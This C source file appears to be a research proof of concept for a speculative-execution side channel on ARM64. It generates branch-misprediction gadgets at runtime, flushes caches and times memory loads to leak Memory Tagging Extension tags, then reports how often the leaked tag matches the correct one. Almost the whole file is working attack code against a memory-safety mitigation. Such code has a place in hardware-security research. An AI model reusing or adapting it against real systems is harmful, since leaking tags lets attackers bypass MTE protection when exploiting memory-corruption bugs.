#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>

#include "config.h"
#include "lib/aarch64.h"
#include "lib/mte.h"
#include "lib/scheduler.h"
#include "lib/timer.h"

__attribute__((noinline))
void* map_and_zero(size_t size, bool tagged) {
  int prot = PROT_READ|PROT_WRITE;
  if (tagged) {
    prot |= PROT_MTE;
  }
  uint64_t* ptr = (uint64_t*)mmap(NULL, size, prot,
    MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
  if (tagged) {
    ptr = mte_tag_and_zero(ptr, size);
  } else {
    memset(ptr, 0, size);
  }
  return ptr;
}

#define CODE_INSTRUCTIONS ((size_t)0x400)
#define CODE_SIZE (CODE_MAX_INSTRUCTIONS * sizeof(uint32_t))

__attribute__((aligned(0x1000)))
uint32_t code[CODE_INSTRUCTIONS];
uint32_t* code_ptr;

__attribute__((noinline))
void code_start(uint32_t nop_instruction) {
  mprotect(code, sizeof(code), PROT_READ|PROT_WRITE);
  for (size_t i = 0; i < CODE_INSTRUCTIONS; ++i) {
    code[i] = nop_instruction;
  }
  code_ptr = code;
}

__attribute__((noinline))
void code_emit(uint32_t instruction) {
  *code_ptr = instruction;
  code_ptr += 1;
}

__attribute__((noinline))
void code_skip(size_t count) {
  code_ptr += count;
}

__attribute__((noinline))
void code_finish() {
  mprotect(code, sizeof(code), PROT_READ|PROT_EXEC);
  flush_instruction_cache(code, sizeof(code));
}

const uint32_t cbnz_x0_3    = 0xb5000060;
const uint32_t cbz_x0_100   = 0xb4002000;
const uint32_t ldr_x0_x0    = 0xf9400000;
const uint32_t ldr_x2_x1    = 0xf9400022;
const uint32_t ldr_x0_x1    = 0xf9400020;
const uint32_t ldr_x2_x2    = 0xf9400042;
const uint32_t ldr_x0_x2    = 0xf9400040;
const uint32_t ldr_x3_x3    = 0xf9400063;
const uint32_t str_x2_x1    = 0xf9000022;
const uint32_t orr_x2_x2_x0 = 0xaa020002;
const uint32_t ret          = 0xd65f03c0;
const uint32_t bkpt         = 0xd4200000;
const uint32_t nop          = 0xd503201f;
const uint32_t isb          = 0xd5033fdf;
const uint32_t dmb_ish      = 0xd5033bbf;
const uint32_t dmb_sy       = 0xd5033fbf;
const uint32_t dsb_ish      = 0xd5033b9f;
const uint32_t dsb_sy       = 0xd5033b9f;

typedef uint64_t (*function)(void*, void*, void*, void*);
const function code_function = (uint64_t(*)(void*,void*,void*,void*))(code);

__attribute__((noinline))
void generate_g1(int test_cpu, int ldnum, int gap) {
  // Generate our test code
  code_start(orr_x2_x2_x0);

  code_emit(isb);
  code_emit(ldr_x0_x0); // slow load
  int jump = 1;
  jump += ldnum; // guess load
  jump += gap;
  jump += 1; // test load
  code_emit((cbz_x0_100 & 0xfff0001f) | (jump<<5));     // branch based on loaded value
  for (int i=0; i<ldnum; i++) {
    code_emit(ldr_x0_x1); // guess load
  }
  code_skip(gap);
  code_emit(ldr_x0_x2);   // test load
  code_emit(ret);
  code_emit(bkpt);
  code_finish();
}
__attribute__((noinline))
void generate_g1_var1(int test_cpu, int ldnum) {

  code_start(orr_x2_x2_x0);

  code_emit(isb);
  code_emit(ldr_x0_x0); // slow load
  int jump = 1;
  jump += ldnum; // guess load
  jump += 4; // test load (Works on 1, 2, 3, 4)
  code_emit((cbz_x0_100 & 0xfff0001f) | (jump<<5));     // branch based on loaded value
  for (int i=0; i<ldnum; i++) {
    code_emit(ldr_x0_x1); // guess load
  }

  code_emit(ldr_x3_x3); // 0
  code_emit(ldr_x3_x3); // 1
  code_emit(ldr_x3_x3); // 2
  code_emit(ldr_x3_x3); // 3
  code_emit(ret);
  code_emit(bkpt);
  code_finish();
}

__attribute__((noinline))
void generate_g1_var2(int test_cpu, int ldnum) {

  code_start(orr_x2_x2_x0);

  code_emit(isb);
  code_emit(ldr_x0_x0); // slow load
  int jump = 1;
  jump += ldnum; // guess load
  jump += 1; // test load (Works on 1, 2, 3, 4)
  code_emit((cbz_x0_100 & 0xfff0001f) | (jump<<5));     // branch based on loaded value
  for (int i=0; i<ldnum; i++) {
    code_emit(ldr_x0_x1); // guess load
  }

  code_emit(ldr_x3_x3); // 0
  code_emit(ldr_x3_x3); // 1
  code_emit(ldr_x3_x3); // 2
  code_emit(ldr_x3_x3); // 3
  code_emit(ret);
  code_emit(bkpt);
  code_finish();
}

__attribute__((noinline))
void generate_g2(int test_cpu, int gap) {
  // Generate our test code

  code_start(nop);
  code_emit(ldr_x0_x0);      // slow load
  code_emit(cbnz_x0_3);      // branch based on loaded value
  code_emit(ret);
  code_emit(bkpt);
                             //   -> incorrect branch
  code_emit(str_x2_x1);      // fast load from tagged memory

  code_emit(ldr_x2_x1);      // fast load from tagged memory
  code_skip(gap);            // 
  code_emit(ldr_x2_x2);      // load from timing_ptr_1

  code_emit(ret);
  code_emit(bkpt);
  code_finish();

}


uint64_t prng_state = 0;
uint32_t prng_counter = 0;

__attribute__((noinline))
uint32_t prng() {{
  prng_state ^= prng_state >> 12;
  prng_state ^= prng_state << 25;
  prng_state ^= prng_state >> 27;
  prng_counter += 362437;
  return (prng_state + prng_counter) >> 32;
}}

int tag_leak(int cpu, size_t iterations) {
  char *page = (char*)map_and_zero(ENTRY_SIZE*32, true);
  uint64_t *slow_ptr = (uint64_t*)page;
  uint64_t *target_ptr = (uint64_t*)mte_tag_and_zero(page+ENTRY_SIZE*3, ENTRY_SIZE);
  uint64_t *test_ptr = (uint64_t*)mte_tag_and_zero(page+ENTRY_SIZE*5, ENTRY_SIZE*5);

  *test_ptr = (uint64_t)((char*)test_ptr+ENTRY_SIZE*1);
  *(uint64_t*)((char*)test_ptr+ENTRY_SIZE*1) = (uint64_t)((char*)test_ptr+ENTRY_SIZE*2);
  *(uint64_t*)((char*)test_ptr+ENTRY_SIZE*2) = (uint64_t)((char*)test_ptr+ENTRY_SIZE*3);
  *(uint64_t*)((char*)test_ptr+ENTRY_SIZE*3) = (uint64_t)((char*)test_ptr+ENTRY_SIZE*4);
  *(uint64_t*)((char*)test_ptr+ENTRY_SIZE*4) = 0;

  uint64_t mask = 0x0f00000000000000;
  uint64_t latency = 0; 
  uint64_t correct_tag = ((uint64_t)target_ptr & mask) >> 56;
  uintptr_t stripped_ptr = (uint64_t)target_ptr & ~mask;
  uint64_t hit[16] = {0};
  uint64_t lat[16] = {0};
  int pmu[2] = {0};
  int pmu_count = 0;
  uint64_t res=0;
  uint64_t *probe_ptr, *ptr;
  uint64_t tag;
  
  for (uint64_t tag = 0; tag < 16; tag++) {
  for (uint64_t i = 0; i < iterations; ++i) {
      uint64_t *probe_ptr;
      for (uint64_t j = 0; j < BRANCH_PREDICTOR_ITERATIONS; ++j) {
        uint64_t is_warmup = ((j + 1) ^ BRANCH_PREDICTOR_ITERATIONS) != 0;
        uint64_t *guess_ptr = (uint64_t*)(stripped_ptr | (tag << 56));
        
        ptr = (uint64_t*)(is_warmup*(uint64_t)target_ptr + !is_warmup*(uint64_t)guess_ptr);

        // Fixed slow
      
        // Fixed probe
        probe_ptr = (char*)test_ptr+ENTRY_SIZE*3;

        *slow_ptr = is_warmup;

        local_memory_barrier();
        instruction_barrier();
        flush_data_cache(probe_ptr);
        flush_data_cache(slow_ptr);
        local_memory_barrier();
        instruction_barrier();

        res += code_function ((char*)slow_ptr, ptr, probe_ptr, test_ptr);
      }
      latency = read_latency((char*)probe_ptr);
      if (latency <= THRESHOLD)
        hit[tag]++;
      lat[tag] += latency;
    } // tag
  } // iterations

  int max_hit = 0;
  int leaked_tag = -1;
  printf("Tag\tHIT\tLAT\n");
  for (int tag=0; tag<16; ++tag) {
    printf("%d\t%.2f\t%.2f\n", tag, (double)hit[tag]/iterations, (double)lat[tag]/iterations);
    if (hit[tag] > max_hit) {
      max_hit = hit[tag];
      leaked_tag = tag;
    }
  }
  printf("Leaked  Tag: %d\n", leaked_tag);
  printf("Correct Tag: %d\n", correct_tag);

  munmap(page, ENTRY_SIZE*32);

  return leaked_tag == correct_tag;
}

void cache_test(size_t iterations) {

  char *page = (char*)map_and_zero(ENTRY_SIZE*2, true);
  uint64_t* slow_ptr = (uint64_t*)mte_tag_and_zero(page, ENTRY_SIZE);
  uint64_t* fast_ptr = (uint64_t*)mte_tag_and_zero(page+ENTRY_SIZE, ENTRY_SIZE);

  uint64_t latency = 0;
  uint64_t fast_latency = 0;
  uint64_t sum = 0;
  uint64_t fast_sum = 0;


  // wait for the timer to start
  while (!read_latency(slow_ptr)) {}
  while (!read_latency(fast_ptr)) {}

  // measure latency of slow_ptr
  for (size_t i = 0; i < iterations; ++i) {
    // asm volatile (
    //   "ldr x8, [%0]\n\t"
    //   : : "r" (&shared_counter)
    //   : "x8"  
    // );
    asm volatile(
      "ldr x8, [%0]\n\t"
    : : "r" (fast_ptr)
    : "x8"
    );
    system_memory_barrier();
    instruction_barrier();
    flush_data_cache(slow_ptr);
    system_memory_barrier();
    instruction_barrier();
    fast_latency = read_latency(fast_ptr);

    fast_sum += fast_latency;
       
    system_memory_barrier();
    // asm volatile (
    //     "ldr x8, [%0]\n\t"
    //     : : "r" (&shared_counter)
    //     : "x8"  
    //   );
    system_memory_barrier();
    instruction_barrier();
    flush_data_cache(slow_ptr);
    system_memory_barrier();
    instruction_barrier();
    latency = read_latency(slow_ptr);

    sum += latency;
  }

  printf("latency: %f\n", (double)sum/iterations);
  printf("fast_latency: %f\n", (double)fast_sum/iterations);
  printf("\n");
  
}


int main(int argc, char** argv) {
  if (argc != 5) {
    fprintf(stderr, "Received %d!\nusage: %s test_cpu iterations mode gadget\n", argc, argv[0]);
    fprintf(stderr, "mode: 0: SYNC, 1: ASYNC\n");
    fprintf(stderr, "gadget: 1: G1, 11: G1-var1, 12: G1-var2, 2: G2\n");
    exit(-1);
  }

  int test_cpu = atoi(argv[1]);
  size_t iterations = atoi(argv[2]);
  int mode = atoi(argv[3]);
  int gadget = atoi(argv[4]);

  size_t start_count = 0;
  size_t end_count = 1000;

  // printf("test_cpu: %d\n", test_cpu);
  cpu_pin_to(test_cpu);

  set_max_priority();

  if (mode == 1) {
    mte_enable(false, DEFAULT_TAG_MASK);
  } else if (mode == 0) {
    mte_enable(true, DEFAULT_TAG_MASK);
  } else {
    printf("Unknown mode %d\n", mode);
    exit(-1);
  }

  prng_state = 1000;
  
  if (gadget == 1) {
    printf("Generate G1\n");
    generate_g1(test_cpu, 2, 80);
  } else if (gadget ==2) {
    printf("Generate G2\n");
    generate_g2(test_cpu, 0);
  } else if (gadget == 11) {
    printf("Generate G1-var1\n");
    generate_g1_var1(test_cpu, 2);
  } else if (gadget == 12) {
    printf("Generate G1-var2\n");
    generate_g1_var2(test_cpu, 2);
  } else {
    printf("Unknown gadget %d\n", gadget);
    exit(-1);
  }

  int score = 0;
  for (int i=0; i < 100; ++i) {
    start_timer();
    score += tag_leak(test_cpu, iterations);
  }
  printf("Score: %d/100\n", score);
  
  return 0;
}
